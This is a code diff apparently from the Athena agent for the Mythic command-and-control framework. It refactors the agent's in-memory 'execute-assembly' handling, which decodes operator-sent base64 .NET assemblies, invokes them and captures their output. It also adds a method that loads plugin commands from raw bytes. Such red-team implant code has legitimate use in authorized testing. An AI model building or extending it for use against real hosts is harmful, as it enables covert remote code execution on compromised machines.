@@ -24,9 +24,9 @@ namespace Athena.Commands
         private AssemblyLoadContext commandContext { get; set; }
         private ExecuteAssemblyContext executeAssemblyContext { get; set; }
         private ConcurrentDictionary<string, IPlugin> loadedPlugins { get; set; }
-        public bool assemblyIsRunning { get; set; }
-        public string assemblyTaskId { get; set; }
-        private StringWriter executeAssemblyWriter { get; set; }
+        //public bool assemblyIsRunning { get; set; }
+        //public string assemblyTaskId { get; set; }
+        //private StringWriter executeAssemblyWriter { get; set; }
         public AssemblyHandler()
         {
             this.commandContext = new AssemblyLoadContext("athcmd");
@@ -70,7 +70,6 @@ namespace Athena.Commands
             //This will load an assembly into our Assembly Load Context for usage with.
             //This can also be used to help fix resolving issues when loading assemblies in trimmed executables.
             LoadAssembly la = JsonSerializer.Deserialize(job.task.parameters, LoadAssemblyJsonContext.Default.LoadAssembly);
-
 
             try
             {
@@ -120,8 +119,10 @@ namespace Athena.Commands
         public async Task<string> ExecuteAssembly(MythicJob job) //How do I deal with this now?
         {
             //Backup the original StdOut
-            var origStdOut = Console.Out;
-            if (assemblyIsRunning)
+            //var origStdOut = Console.Out;
+
+            //This might be able to be replaced with the functionality in PluginHandler
+            if (PluginHandler.StdIsBusy())
             {
                 return new ResponseResult()
                 {
@@ -133,38 +134,36 @@ namespace Athena.Commands
 
             ExecuteAssemblyTask ea = JsonSerializer.Deserialize(job.task.parameters, ExecuteAssemblyTaskJsonContext.Default.ExecuteAssemblyTask);
 
-            //Indicating an execute-assembly task is running.
-            this.assemblyIsRunning = true;
-            this.assemblyTaskId = job.task.id;
-
             //Add an alert for when the assembly is finished executing
             try
             {
-                using (this.executeAssemblyWriter = new StringWriter())
+                StringWriter sw = new StringWriter();
+                if (PluginHandler.CaptureStdOut(job.task.id))
                 {
-                    //Capture StdOut
-                    Console.SetOut(this.executeAssemblyWriter);
-
-                    //Load the Assembly
+                    //Load the assembly
                     var assembly = this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(ea.asm)));
 
                     //Invoke the Assembly
                     assembly.EntryPoint.Invoke(null, new object[] { await Misc.SplitCommandLine(ea.arguments) }); //I believe this blocks until it's finished
-
+                    
                     //Return StdOut back to original location
-                    Console.SetOut(origStdOut);
+                    PluginHandler.ReleaseStdOut();
+
+                    return await this.GetAssemblyOutput();
                 }
-
-                this.assemblyIsRunning = false;
-
-                return await this.GetAssemblyOutput();
-
-                //Maybe set an event that the execution is finished?
+                else
+                {
+                    return new ResponseResult()
+                    {
+                        completed = "true",
+                        user_output = "An assembly is already executing!",
+                        task_id = job.task.id,
+                    }.ToJson();
+                }
             }
             catch (Exception e)
             {
-                this.assemblyIsRunning = false;
-                Console.SetOut(origStdOut);
+                PluginHandler.ReleaseStdOut();
                 return new ResponseResult
                 {
                     completed = "true",
@@ -179,17 +178,11 @@ namespace Athena.Commands
         /// </summary>
         public async Task<string> GetAssemblyOutput()
         {
-            await this.executeAssemblyWriter.FlushAsync();
-            string output = this.executeAssemblyWriter.GetStringBuilder().ToString();
-
-            //Clear the writer
-            this.executeAssemblyWriter.GetStringBuilder().Clear();
-
             return new ResponseResult
             {
-                user_output = output,
-                task_id = this.assemblyTaskId,
-                completed = (!this.assemblyIsRunning).ToString()
+                user_output = await PluginHandler.GetStdOut(),
+                task_id = PluginHandler.StdOwner(),
+                completed = (!PluginHandler.StdIsBusy()).ToString()
             }.ToJson();
         }
         /// <summary>
@@ -222,6 +215,10 @@ namespace Athena.Commands
                 }.ToJson();
             }
         }
+        
+        
+        
+        
         /// <summary>
         /// Load a command into the command execution context
         /// </summary>
@@ -241,9 +238,11 @@ namespace Athena.Commands
                 }.ToJson();
             }
 
+            byte[] buf = await Misc.Base64DecodeToByteArrayAsync(command.asm);
+
             try
             {
-                var loadedAssembly = this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(command.asm)));
+                var loadedAssembly = this.commandContext.LoadFromStream(new MemoryStream(buf));
                 foreach (Type t in loadedAssembly.GetTypes())
                 {
                     if (typeof(IPlugin).IsAssignableFrom(t))
@@ -283,6 +282,67 @@ namespace Athena.Commands
                     completed = "true",
                     user_output = "Failed to load Command!" + Environment.NewLine + e.Message,
                     task_id = job.task.id,
+                    status = "error",
+                    commands = new List<CommandsResponse>(),
+                }.ToJson();
+
+            }
+        }
+        public async Task<string> LoadCommandAsync(string task_id, string command, byte[] buf)
+        {
+            if (this.loadedPlugins.ContainsKey(task_id))
+            {
+                return new LoadCommandResponseResult
+                {
+                    completed = "true",
+                    user_output = "Command already loaded.",
+                    task_id = task_id,
+                    status = "error"
+                }.ToJson();
+            }
+
+            try
+            {
+                var loadedAssembly = this.commandContext.LoadFromStream(new MemoryStream(buf));
+                foreach (Type t in loadedAssembly.GetTypes())
+                {
+                    if (typeof(IPlugin).IsAssignableFrom(t))
+                    {
+                        IPlugin plug = (IPlugin)Activator.CreateInstance(t);
+                        this.loadedPlugins.GetOrAdd(command, plug);
+                        return new LoadCommandResponseResult()
+                        {
+                            completed = "true",
+                            user_output = "Command loaded!",
+                            task_id = task_id,
+                            commands = new List<CommandsResponse>()
+                                {
+                                    new CommandsResponse()
+                                    {
+                                        action = "add",
+                                        cmd = command,
+                                    }
+                                }
+                        }.ToJson();
+                    }
+                }
+
+                return new LoadCommandResponseResult()
+                {
+                    completed = "true",
+                    user_output = "Failed to load command, no assignable type." + Environment.NewLine,
+                    task_id = task_id,
+                    status = "error",
+                    commands = new List<CommandsResponse>(),
+                }.ToJson();
+            }
+            catch (Exception e)
+            {
+                return new LoadCommandResponseResult()
+                {
+                    completed = "true",
+                    user_output = "Failed to load Command!" + Environment.NewLine + e.Message,
+                    task_id = task_id,
                     status = "error",
                     commands = new List<CommandsResponse>(),
                 }.ToJson();
